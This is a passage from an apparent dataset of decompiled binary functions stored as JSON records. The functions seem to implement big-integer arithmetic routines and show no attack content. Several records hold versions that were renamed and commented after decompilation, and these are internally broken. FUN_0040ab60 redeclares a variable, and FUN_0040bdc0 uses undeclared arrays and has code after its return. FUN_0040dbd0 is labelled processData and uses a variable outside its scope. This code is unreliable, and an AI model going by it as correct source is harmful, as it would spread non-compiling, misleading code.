if (tempUnsignedInt == 0) {\n                    tempUnsignedInt = FUN_00407f00(&anotherInteger, minIntermediateResult, &anotherInteger, 0);\n                    returnValue = (ulong)tempUnsignedInt; \n                    \n                    if (tempUnsignedInt == 0) goto LAB_0040aa2b;\n                }\n            }\n        }\n    LAB_0040ab20:\n        \n        FUN_004064f0(&dataForProcessing);\n    LAB_0040a9da:\n        \n        FUN_004064f0(&anotherInteger);\n        return returnValue; \n    }\n    \n    if (firstParam == thirdParam) goto LAB_0040a97c;\n    \n    returnValue = FUN_00406750(firstParam, thirdParam);\n    intermediateResult2 = (int)returnValue; \n}"}
{"Function Name": "FUN_0040ab60", "Address": "0040ab60", "Source Code": "undefined8 FUN_0040ab60(undefined4 *param_1, int *param_2)\n{\n    undefined8 returnValue; \n    long loopCounter; \n    int calculationResult; \n    ulong bitManipulation; \n    int valueFromParam2 = *param_2; \n    if (valueFromParam2 != 0) { \n        int offsetCalculation = (valueFromParam2 - 1) * 0x3c; \n        calculationResult = offsetCalculation; \n        \n        for (bitManipulation = *(ulong *)(*(long *)(param_2 + 4) - 8 + (long)valueFromParam2 * 8); bitManipulation != 0; bitManipulation >>= 1) {\n            calculationResult++; \n        }\n        if (valueFromParam2 > 1) { \n            valueFromParam2 = calculationResult % 0x3c - 1; \n            returnValue = FUN_004063d0(param_1, calculationResult % 0x3c + offsetCalculation - 1); \n            if ((int)returnValue != 0) { \n                return returnValue; \n            }\n        }\n    }\n    \n    int valueFromParam2 = param_1[1]; \n    loopCounter = 0; \n    param_1[2] = 0; \n    *param_1 = 0; \n    undefined8 *pointerToFifthElement = *(undefined8 **)(param_1 + 4); \n    \n    if (valueFromParam2 > 0) { \n        do {\n            pointerToFifthElement[loopCounter] = 0; \n            loopCounter++; \n        } while (loopCounter < valueFromParam2); \n    }\n    \n    *pointerToFifthElement = 1; \n    *param_1 = 1; \n    while (true) { \n        returnValue = FUN_00407400(param_1, param_1); \n        if ((int)returnValue != 0) { \n            return returnValue; \n        }\n        calculationResult = FUN_004065f0(param_1, param_2); \n        if (calculationResult != -1 && (returnValue = FUN_0040a1c0(param_1, param_2, param_1), (int)returnValue != 0)) { \n            break; \n        }\n        if (++valueFromParam2 > 0x3b) { \n            return 0; \n        }\n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_0040aec0", "Address": "0040aec0", "Source Code": "ulong FUN_0040aec0(undefined8 inputParam, int *inputParam2, long inputParam3)\n{\n    ulong returnValue; \n    uint intermediateResult;  \n    ulong param2AsUlong; \n    undefined temporaryData[32]; \n    returnValue = FUN_00406af0(temporaryData); \n    if ((int)returnValue == 0) { \n        int dereferencedParam2 = *inputParam2; \n        param2AsUlong = (ulong)dereferencedParam2; \n        if (dereferencedParam2 != 0) { \n            intermediateResult = (dereferencedParam2 - 1) * 0x3c; \n            returnValue = *(ulong *)(*(long *)(inputParam2 + 4) + -8 + param2AsUlong * 8); \n            if (returnValue != 0) { \n                do {\n                    intermediateResult++; \n                    returnValue >>= 1; \n                } while (returnValue != 0); \n            } else {\n                param2AsUlong = (ulong)intermediateResult; \n            }\n        }\n    }\n    while (true) { \n        intermediateResult = FUN_00407f00(inputParam, param2AsUlong & 0xffffffff, temporaryData, inputParam); \n        returnValue = (ulong)intermediateResult; \n        if (intermediateResult != 0) break; \n        if (inputParam3 != 1) { \n            intermediateResult = FUN_004078b0(temporaryData, inputParam3, temporaryData); \n            returnValue = (ulong)intermediateResult; \n            if (intermediateResult != 0) break; \n        }\n        intermediateResult = FUN_00409900(inputParam, temporaryData, inputParam); \n        returnValue = (ulong)intermediateResult; \n        if ((intermediateResult != 0) || (dereferencedParam2 = FUN_004065f0(inputParam, inputParam2), dereferencedParam2 == -1)) break; \n        intermediateResult = FUN_0040a1c0(inputParam, inputParam2, inputParam); \n        returnValue = (ulong)intermediateResult; \n        if (intermediateResult != 0) break; \n    }\n    FUN_004064f0(temporaryData); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040b980", "Address": "0040b980", "Source Code": "ulong FUN_0040b980(undefined8 input1, undefined8 input2, undefined8 input3, undefined8 input4)\n{\n    uint result; \n    undefined tempStorage[40]; \n    \n    if (FUN_00406af0(tempStorage) != 0) {\n        \n        return FUN_00406af0(tempStorage);\n    }\n    \n    \n    result = FUN_0040a6e0(input1, input2, tempStorage);\n    \n    \n    if (result == 0) {\n        result = FUN_0040b8d0(tempStorage, input3, input4);\n    }\n    \n    \n    FUN_004064f0(tempStorage);\n    \n    \n    return (ulong)result;\n}"}
{"Function Name": "FUN_0040bdc0", "Address": "0040bdc0", "Source Code": "\nulong FUN_0040bdc0(long input_param, int *input_array_1, int *input_array_2)\n{\n    uint function_result; // Variable to store intermediate results\n    ulong return_value; // Variable to store the return value\n    long loop_counter; // Loop counter\n    int *iterator_1; // Pointer for iterating through param_3\n    int *iterator_2; // Pointer for iterating through local_48\n    byte control_byte; // Byte variable for control flow\n    undefined local_data_1 [32]; // Local storage for data\n    undefined local_data_2 [32]; // Local storage for data\n    int local_array_1 [4]; // Local array for data\n    int local_array_2 [2]; // Local array for data\n    int control_var_1; // Local variable for control flow\n    int control_var_2; // Local variable for control flow\n    int control_var_3; // Local variable for control flow\n\n    control_byte = 0; // Initialize bVar8 to 0\n    // Check if the first element of param_2 is less than 1 or if a specific condition is met\n    if ((*input_array_1 < 1) || (return_value = 0xfffffffd, (**(byte **)(input_array_1 + 4) & 1) != 0)) {\n        // Call a function to initialize local variables\n        return_value = FUN_00406b50(local_data_1, local_data_2, local_array_1, local_array_2, &control_var_3, 0);\n        // Check if the function call was successful\n        if ((int)return_value == 0) {\n            // Call another function to process param_2 with local_e8\n            function_result = FUN_00406750(input_array_1, local_data_1);\n            return_value = (ulong)function_result; // Store the result\n            // Check if the function call was successful\n            if (function_result == 0) {\n                // Call a function to process param_2 with local_c8\n                function_result = FUN_0040b8d0(input_param, input_array_1, local_data_2);\n                return_value = (ulong)function_result; // Store the result\n                // Check if the function call was successful\n                if (function_result == 0) {\n                    // Call a function to process local_a8\n                    function_result = FUN_00406750(local_data_1, local_array_1);\n                    return_value = (ulong)function_result; // Store the result\n                    // Check if the function call was successful\n                    if (function_result == 0) {\n                        // Call a function to process local_88\n                        function_result = FUN_00406750(local_data_2, local_array_2);\n                        return_value = (ulong)function_result; // Store the result\n                        // Check if the function call was successful\n                        if (function_result == 0) {\n                            loop_counter = 0; // Reset loop counter\n                            // Initialize local_38 if local_44 is greater than 0\n                            if (0 < control_var_2) {\n                                do {\n                                    local_array_3[loop_counter] = 0; // Set elements of local_38 to 0\n                                    loop_counter = loop_counter + 1; // Increment loop counter\n                                } while ((int)loop_counter < control_var_2); // Continue until all elements are set\n                            }\n                            *local_array_3 = 1; // Set the first element of local_38 to 1\n                            control_var_3 = 1; // Initialize local_48\n                            do {\n                                // Process local_a8 while certain conditions are met\n                                while ((0 < local_array_1[0] && ((*local_98 & 1) == 0))) {\n                                    function_result = FUN_00406860(local_array_1); // Call a function to process local_a8\n                                    // Check if the function call was successful or if other conditions are met\n                                    if (((function_result != 0) || (((0 < local_68[0] && ((*local_58 & 1) != 0)) && (function_result = FUN_0040b100(local_68, local_data_1), function_result != 0)))) || (function_result = FUN_00406860(local_68), function_result != 0)) goto LAB_0040c0b0;\n                                }\n                                // Process local_88 while certain conditions are met\n                                while ((0 < local_array_2[0] && ((*local_78 & 1) == 0))) {\n                                    function_result = FUN_00406860(local_array_2); // Call a function to process local_88\n                                    // Check if the function call was successful or if other conditions are met\n                                    if ((function_result != 0) || ((((0 < control_var_3 && ((*(byte *)local_array_3 & 1) != 0)) && (function_result = FUN_0040b100(&control_var_3, local_data_1, &control_var_3), function_result != 0)) || (function_result = FUN_00406860(&control_var_3, &control_var_3), function_result != 0)))) goto LAB_0040c0b0;\n                                }\n                                // Call a function to compare local_a8 and local_88\n                                int comparison_result = FUN_00406680(local_array_1, local_array_2);\n                                // Check if the comparison resulted in an error\n                                if (comparison_result == -1) {\n                                    function_result = FUN_0040b100(local_array_2, local_array_1); // Process local_88 and local_a8\n                                    if (function_result != 0) goto LAB_0040c0b0; // Check for errors\n                                    function_result = FUN_0040b100(&control_var_3, local_68, &control_var_3); // Process local_48 and local_68\n                                } else {\n                                    function_result = FUN_0040b100(local_array_1, local_array_2); // Process local_a8 and local_88\n                                    if (function_result != 0) goto LAB_0040c0b0; // Check for errors\n                                    function_result = FUN_0040b100(local_68, &control_var_3); // Process local_68 and local_48\n                                }\n                                // Check if the function call was successful\n                                if (function_result != 0) goto LAB_0040c0b0;\n                                // Check if local_a8 is empty\n                                if (local_array_1[0] == 0) {\n                                    // Check additional conditions before breaking\n                                    if (((local_80 != 1) && (local_array_2[0] < 2)) && (comparison_result = FUN_00405a00(local_array_2, 1), comparison_result == 0)) {\n                                        comparison_result = *(int *)(input_param + 8); // Retrieve a value from param_1\n                                        goto LAB_0040c0e4; // Jump to cleanup\n                                    }\n                                    return_value = 0xfffffffd; // Set return value to error code\n                                    break; // Exit the loop\n                                }\n                            } while (true); // Continue looping\n                        }\n                    }\n                }\n            }\n        }\n    }\n    goto LAB_0040be4e; // Jump to cleanup\n\nLAB_0040c0b0:\n    return_value = (ulong)function_result; // Store the error code\n\nLAB_0040be4e:\n    FUN_00406540(local_data_1, local_data_2, local_array_1, local_array_2, &control_var_3, 0); // Cleanup function call\n    return return_value; // Return the result\n\n    // Loop to process local_48 and param_2\n    while (function_result = FUN_0040a6e0(&control_var_3, input_array_1, &control_var_3), function_result == 0) {\nLAB_0040c0e4:\n        int stored_value = control_var_3; // Store the value of local_48\n        // Check if local_40 is not equal to 1\n        if (control_var_1 != 1) {\n            iterator_1 = input_array_2; // Initialize pointer to param_3\n            iterator_2 = &control_var_3; // Initialize pointer to local_48\n            for (loop_counter = 6; loop_counter != 0; loop_counter = loop_counter + -1) { // Loop 6 times\n                *iterator_2 = *iterator_1; // Copy value from param_3 to local_48\n                iterator_1 = iterator_1 + (ulong)control_byte * -2 + 1; // Move to the next element in param_3\n                iterator_2 = iterator_2 + (ulong)control_byte * -2 + 1; // Move to the next element in local_48\n            }\n            *input_array_2 = stored_value; // Store the result in param_3\n            input_array_2[1] = control_var_2; // Store local_44 in param_3\n            *(undefined8 **)(input_array_2 + 4) = local_array_3; // Store local_38 in param_3\n            input_array_2[2] = comparison_result; // Store iVar3 in param_3\n            goto LAB_0040be4e; // Jump to cleanup\n        }\n    }\n}\n"}
{"Function Name": "FUN_0040c6f0", "Address": "0040c6f0", "Source Code": "ulong FUN_0040c6f0(undefined8 input_param_1, undefined8 input_param_2, undefined8 input_param_3, undefined8 input_param_4)\n{\n    uint result; \n    undefined temp_storage[40]; \n    \n    if (FUN_00406af0(temp_storage) != 0) {\n        \n        return FUN_00406af0(temp_storage);\n    }\n    \n    \n    result = FUN_0040b100(input_param_1, input_param_2, temp_storage);\n    \n    \n    if (result == 0) {\n        result = FUN_0040b8d0(temp_storage, input_param_3, input_param_4);\n    }\n    \n    \n    FUN_004064f0(temp_storage);\n    \n    \n    return (ulong)result;\n}"}
{"Function Name": "FUN_0040d460", "Address": "0040d460", "Source Code": "ulong FUN_0040d460(undefined8 param_1,undefined8 param_2,undefined8 *param_3,undefined8 *param_4,\nundefined8 *param_5)\n{\nundefined4 uVar1;\nint iVar2;\nundefined8 *puVar3;\nundefined8 uVar4;\nundefined8 uVar5;\nuint uVar6;\nulong uVar7;\nlong lVar8;\nundefined4 local_198;\nint iStack_194;\nundefined4 local_190;\nundefined4 uStack_18c;\nundefined8 *local_188;\nundefined4 local_178;\nundefined4 uStack_174;\nundefined4 local_170;\nundefined4 uStack_16c;\nundefined8 local_168;\nundefined4 local_158;\nundefined4 uStack_154;\nint local_150;\nundefined4 uStack_14c;\nundefined8 local_148;\nundefined local_138 [32];\nundefined4 local_118;\nint local_114;\nundefined4 local_110;\nundefined8 *local_108;\nint local_f8 [8];\nundefined local_d8 [32];\nundefined local_b8 [32];\nundefined local_98 [32];\nundefined local_78 [32];\nundefined local_58 [40];\nuVar7 = FUN_00406b50(&local_198,&local_178,&local_158,local_138,&local_118,local_f8,local_d8,\nlocal_b8,local_98,local_78,local_58,0);\nif ((int)uVar7 == 0) {\nlVar8 = 0;\nlocal_190 = 0;\nif (0 < iStack_194) {\ndo {\nlocal_188[lVar8] = 0;\nlVar8 = lVar8 + 1;\n} while ((int)lVar8 < iStack_194);\n}\n*local_188 = 1;\nlocal_198 = 1;\nuVar6 = FUN_00406750(param_1,&local_158);\nuVar7 = (ulong)uVar6;\nif (uVar6 == 0) {\nlVar8 = 0;\nlocal_110 = 0;\nif (0 < local_114) {\ndo {\nlocal_108[lVar8] = 0;\nlVar8 = lVar8 + 1;\n} while ((int)lVar8 < local_114);\n}\n*local_108 = 1;\nlocal_118 = 1;\nuVar6 = FUN_00406750(param_2,local_f8);\nuVar7 = (ulong)uVar6;\nif (uVar6 == 0) {\nwhile (local_f8[0] != 0) {\nuVar6 = FUN_0040b190(&local_158,local_f8,local_78,0);\nif (((((uVar6 != 0) || (uVar6 = FUN_0040cb50(local_138,local_78,local_58), uVar6 != 0)) ||\n((uVar6 = FUN_0040b100(&local_198,local_58,local_d8), uVar6 != 0 ||\n((uVar6 = FUN_0040cb50(&local_118,local_78,local_58), uVar6 != 0 ||\n(uVar6 = FUN_0040b100(&local_178,local_58,local_b8), uVar6 != 0)))))) ||\n(uVar6 = FUN_0040cb50(local_f8,local_78,local_58), uVar6 != 0)) ||\n(((((uVar6 = FUN_0040b100(&local_158,local_58,local_98), uVar6 != 0 ||\n(uVar6 = FUN_00406750(local_138,&local_198), uVar6 != 0)) ||\n(uVar6 = FUN_00406750(&local_118,&local_178), uVar6 != 0)) ||\n((uVar6 = FUN_00406750(local_f8,&local_158), uVar6 != 0 ||\n(uVar6 = FUN_00406750(local_d8,local_138), uVar6 != 0)))) ||\n((uVar6 = FUN_00406750(local_b8,&local_118), uVar6 != 0 ||\n(uVar6 = FUN_00406750(local_98,local_f8), uVar6 != 0)))))) goto LAB_0040d788;\n}\nif ((local_150 != 1) ||\n(((uVar6 = FUN_00407a20(&local_198), uVar6 == 0 &&\n(uVar6 = FUN_00407a20(&local_178), uVar6 == 0)) &&\n(uVar6 = FUN_00407a20(&local_158), uVar6 == 0)))) {\nif (param_3 != (undefined8 *)0x0) {\nuVar4 = CONCAT44(iStack_194,local_198);\nlocal_198 = *(undefined4 *)param_3;\niStack_194 = *(int *)((long)param_3 + 4);\n*param_3 = uVar4;\nuVar4 = CONCAT44(uStack_18c,local_190);\nlocal_190 = *(undefined4 *)(param_3 + 1);\npuVar3 = (undefined8 *)param_3[2];\nparam_3[1] = uVar4;\nparam_3[2] = local_188;\nlocal_188 = puVar3;\n}\nif (param_4 != (undefined8 *)0x0) {\nuVar5 = CONCAT44(uStack_174,local_178);\nlocal_178 = *(undefined4 *)param_4;\nuStack_174 = *(undefined4 *)((long)param_4 + 4);\nuVar1 = *(undefined4 *)(param_4 + 1);\nuVar4 = param_4[2];\n*param_4 = uVar5;\nparam_4[1] = CONCAT44(uStack_16c,local_170);\nparam_4[2] = local_168;\nlocal_170 = uVar1;\nlocal_168 = uVar4;\n}\nif (param_5 != (undefined8 *)0x0) {\nuVar5 = CONCAT44(uStack_154,local_158);\nlocal_158 = *(undefined4 *)param_5;\nuStack_154 = *(undefined4 *)((long)param_5 + 4);\niVar2 = *(int *)(param_5 + 1);\nuVar4 = param_5[2];\n*param_5 = uVar5;\nparam_5[1] = CONCAT44(uStack_14c,local_150);\nparam_5[2] = local_148;\nlocal_150 = iVar2;\nlocal_148 = uVar4;\n}\ngoto LAB_0040d55e;\n}\nLAB_0040d788:\nuVar7 = (ulong)uVar6;\n}\n}\nLAB_0040d55e:\nFUN_00406540(&local_198,&local_178,&local_158,local_138,&local_118,local_f8,local_d8,local_b8,\nlocal_98,local_78,local_58,0);\n}\nreturn uVar7;\n}\nLocal Variable: local_58 : undefined1\nLocal Variable: local_78 : undefined1\nLocal Variable: local_98 : undefined1\nLocal Variable: local_b8 : undefined1\nLocal Variable: local_d8 : undefined1\nLocal Variable: local_f8 : undefined4\nLocal Variable: local_108 : undefined8\nLocal Variable: local_110 : undefined4\nLocal Variable: local_114 : undefined4\nLocal Variable: local_118 : undefined4\nLocal Variable: local_138 : undefined1\nLocal Variable: local_148 : undefined8\nLocal Variable: local_150 : undefined8\nLocal Variable: local_158 : undefined8\nLocal Variable: local_168 : undefined8\nLocal Variable: local_170 : undefined8\nLocal Variable: local_178 : undefined8\nLocal Variable: local_188 : undefined8\nLocal Variable: local_190 : undefined8\nLocal Variable: local_198 : undefined8\nLocal Variable: local_1a0 : undefined8\nLocal Variable: local_1a8 : undefined8\nLocal Variable: local_1b0 : undefined8\nLocal Variable: local_1b8 : undefined8\nLocal Variable: local_1c0 : undefined8\nLocal Variable: local_1c8 : undefined8\nLocal Variable: local_1d0 : undefined8\nLocal Variable: local_1d8 : undefined8\nLocal Variable: local_1e0 : undefined8\nLocal Variable: local_1e8 : undefined8"}
{"Function Name": "FUN_0040d8e0", "Address": "0040d8e0", "Source Code": "ulong FUN_0040d8e0(undefined8 inputParam1, undefined8 inputParam2, long inputParam3)\n{\n    uint resultCode; \n    ulong setupResult; \n    undefined tempBuffer1[32]; \n    undefined tempBuffer2[40]; \n    \n    setupResult = FUN_00406b50(tempBuffer1, tempBuffer2, 0);\n    \n    if (setupResult != 0) {\n        return setupResult;\n    }\n    \n    \n    resultCode = FUN_0040a950(inputParam1, inputParam2, tempBuffer1);\n    \n    if (resultCode == 0) {\n        \n        if (FUN_004065f0(inputParam1, inputParam2) == -1) {\n            \n            resultCode = FUN_0040b190(inputParam1, tempBuffer1, tempBuffer2, 0);\n            \n            if (resultCode != 0) goto LAB_0040d956;\n            \n            resultCode = FUN_0040cb50(inputParam2, tempBuffer2, inputParam3);\n        } else {\n            \n            resultCode = FUN_0040b190(inputParam2, tempBuffer1, tempBuffer2, 0);\n            \n            if (resultCode != 0) goto LAB_0040d956;\n            \n            resultCode = FUN_0040cb50(inputParam1, tempBuffer2, inputParam3);\n        }\n    }\n    \n    \n    *(undefined4 *)(inputParam3 + 8) = 0;\nLAB_0040d956:\n    \n    FUN_00406540(tempBuffer1, tempBuffer2, 0);\n    \n    return (ulong)resultCode;\n}"}
{"Function Name": "FUN_0040d9c0", "Address": "0040d9c0", "Source Code": "ulong FUN_0040d9c0(undefined8 input1, undefined8 input2, undefined8 input3, undefined8 input4)\n{\n    uint resultCode; \n    undefined tempStorage[40]; \n    \n    if (FUN_00406af0(tempStorage) != 0) {\n        \n        return FUN_00406af0(tempStorage);\n    }\n    \n    \n    resultCode = FUN_0040cb50(input1, input2, tempStorage);\n    \n    \n    if (resultCode == 0) {\n        resultCode = FUN_0040b8d0(tempStorage, input3, input4);\n    }\n    \n    \n    FUN_004064f0(tempStorage);\n    \n    \n    return (ulong)resultCode;\n}"}
{"Function Name": "FUN_0040da30", "Address": "0040da30", "Source Code": "ulong FUN_0040da30(int *inputArray, int *inputValue, undefined8 additionalParam)\n{\n    uint intermediateResult; \n    ulong finalReturnValue; \n    int valueFromParam2; \n    undefined4 temporaryStorage; \n    valueFromParam2 = *inputValue; \n    finalReturnValue = FUN_00406f80(&temporaryStorage, inputArray); \n    if ((int)finalReturnValue != 0) { \n        return finalReturnValue; \n    }\n    FUN_00407e40(&temporaryStorage, valueFromParam2 + -1); \n    if (valueFromParam2 < 0) { \n        intermediateResult = FUN_0040cb50(&temporaryStorage, additionalParam, &temporaryStorage); \n    } else {\n        intermediateResult = FUN_00409cd0(&temporaryStorage, additionalParam, &temporaryStorage, valueFromParam2); \n    }\n    finalReturnValue = (ulong)intermediateResult; \n    if (intermediateResult == 0) { \n        valueFromParam2 = valueFromParam2 + 1; \n        FUN_00407e40(&temporaryStorage, valueFromParam2); \n        intermediateResult = FUN_004071f0(inputArray, valueFromParam2 * 0x3c, inputArray); \n        finalReturnValue = (ulong)intermediateResult; \n        if (intermediateResult == 0) { \n            intermediateResult = FUN_00409ac0(&temporaryStorage, inputValue, &temporaryStorage, valueFromParam2); \n            finalReturnValue = (ulong)intermediateResult; \n            if (intermediateResult == 0) { \n                intermediateResult = FUN_0040b100(inputArray, &temporaryStorage, inputArray); \n                finalReturnValue = (ulong)intermediateResult; \n                if (intermediateResult == 0) { \n                    if ((inputArray[2] == 1) || ((*inputArray < 2 && (FUN_00405a00(inputArray, 0) == -1)))) { \n                        temporaryStorage = 1; \n                        intermediateResult = FUN_00407140(&temporaryStorage, valueFromParam2); \n                        if (intermediateResult == 0) { \n                            intermediateResult = FUN_0040a6e0(inputArray, &temporaryStorage, inputArray); \n                            goto joined_r0x0040dbc4; \n                        }\n                    } else {\n                        do {\n                            valueFromParam2 = FUN_00406680(inputArray, inputValue); \n                            if (valueFromParam2 == -1) goto LAB_0040dad0; \n                            intermediateResult = FUN_0040a1c0(inputArray, inputValue, inputArray); \njoined_r0x0040dbc4: \n                        } while (intermediateResult == 0); \n                    }\n                    finalReturnValue = (ulong)intermediateResult; \n                }\n            }\n        }\n    }\nLAB_0040dad0: \n    FUN_004064f0(&temporaryStorage); \n    return finalReturnValue; \n}"}
{"Function Name": "FUN_0040dbd0", "Address": "0040dbd0", "Source Code": "ulong processData(undefined8 inputParam, int *intPointer, undefined8 additionalParam)\n{\n    ulong returnValue; \n    uint intermediateResult;  \n    ulong computedValue; \n    undefined tempData[32]; \n    returnValue = FUN_00406af0(tempData); \n    if ((int)returnValue == 0) { \n        int dereferencedValue = *intPointer; \n        computedValue = (ulong)dereferencedValue; \n        if (dereferencedValue != 0) { \n            intermediateResult = (dereferencedValue - 1) * 0x3c; \n            returnValue = *(ulong *)(*(long *)(intPointer + 4) - 8 + computedValue * 8); \n            if (returnValue != 0) { \n                do {\n                    intermediateResult++; \n                    returnValue >>= 1; \n                } while (returnValue != 0); \n            } \n            computedValue = (ulong)intermediateResult; \n        }\n    }\n    do {\n        intermediateResult = FUN_00407f00(inputParam, computedValue & 0xffffffff, tempData, inputParam); \n        returnValue = (ulong)intermediateResult; \n        if (intermediateResult != 0) break; \n        intermediateResult = FUN_0040cb50(tempData, additionalParam, tempData); \n        returnValue = (ulong)intermediateResult; \n        if (intermediateResult != 0) break; \n        intermediateResult = FUN_00409900(inputParam, tempData, inputParam); \n        returnValue = (ulong)intermediateResult; \n        if (intermediateResult != 0) break; \n        dereferencedValue = FUN_004065f0(inputParam, intPointer); \n        if (dereferencedValue == -1) break; \n        intermediateResult = FUN_0040a1c0(inputParam, intPointer, inputParam); \n        returnValue = (ulong)intermediateResult; \n    } while (intermediateResult == 0); \n    FUN_004064f0(tempData); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040dff0", "Address": "0040dff0", "Source Code": "ulong FUN_0040dff0(int *param_1,undefined8 param_2)\n{\nint iVar1;\nuint uVar2;\nulong uVar3;\nundefined local_158 [32];\nundefined local_138 [32];\nundefined local_118 [32];\nundefined local_f8 [32];\nundefined local_d8 [32];\nundefined local_b8 [32];\nundefined local_98 [32];\nundefined local_78 [32];\nundefined local_58 [40];\nuVar3 = FUN_00406b50(local_158,local_138,local_118,local_f8,local_d8,local_98,local_78,local_58,\nlocal_b8,0);\nif ((int)uVar3 == 0) {\niVar1 = *param_1 / 3;\nuVar2 = FUN_004071f0(param_1,iVar1 * 0x3c,local_98);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406750(param_1,local_78);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nFUN_00407e40(local_78,iVar1);\nuVar2 = FUN_004071f0(local_78,iVar1 * 0x3c,local_78);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406750(param_1,local_58);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nFUN_00407e40(local_58,iVar1 * 2);\nuVar2 = FUN_0040df80(local_98,local_158);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040df80(local_58,local_d8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407400(local_98,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,local_78,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407400(local_b8,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,local_58,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040df80(local_b8,local_138);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407400(local_58,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,local_78,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407400(local_b8,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,local_98,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040df80(local_b8,local_f8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_58,local_78,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,local_98,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040df80(local_b8,local_118);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_138,local_d8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_f8,local_158);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406860(local_138);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406860(local_f8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_118,local_158);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_118,local_d8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_138,local_118);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_f8,local_118);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_004074e0(local_158,3,local_b8)\n;\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_138,local_b8)\n;\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_004074e0(local_d8,3,\nlocal_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_f8,\nlocal_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_004078b0(local_118,3);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_118,local_138);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_118,local_f8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_138,local_118);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040b100(local_f8,local_118)\n;\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406d50(local_138,\nlocal_138,0);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00406d50(local_f8,\nlocal_f8,0);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407140(local_138,iVar1);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407140(local_118,iVar1 * 2);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407140(local_f8,iVar1 * 3);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_00407140(local_d8,iVar1 * 4);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_158,local_138\n,param_2);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_118,\nlocal_f8,local_b8\n);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_d8,\nlocal_b8,local_b8);\nuVar3 = (ulong)uVar2;\nif (uVar2 == 0) {\nuVar2 = FUN_0040a6e0(local_b8,param_2,param_2);\nuVar3 = (ulong)uVar2;\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\nFUN_00406540(local_158,local_138,local_118,local_f8,local_d8,local_98,local_78,local_58,local_b8\n,0);\n}\nreturn uVar3;\n}\nLocal Variable: local_58 : undefined1\nLocal Variable: local_78 : undefined1\nLocal Variable: local_98 : undefined1\nLocal Variable: local_b8 : undefined1\nLocal Variable: local_d8 : undefined1\nLocal Variable: local_f8 : undefined1\nLocal Variable: local_118 : undefined1\nLocal Variable: local_138 : undefined1\nLocal Variable: local_158 : undefined1\nLocal Variable: local_15c : undefined4\nLocal Variable: local_168 : undefined8\nLocal Variable: local_170 : undefined8\nLocal Variable: local_178 : undefined8\nLocal Variable: local_180 : undefined8\nLocal 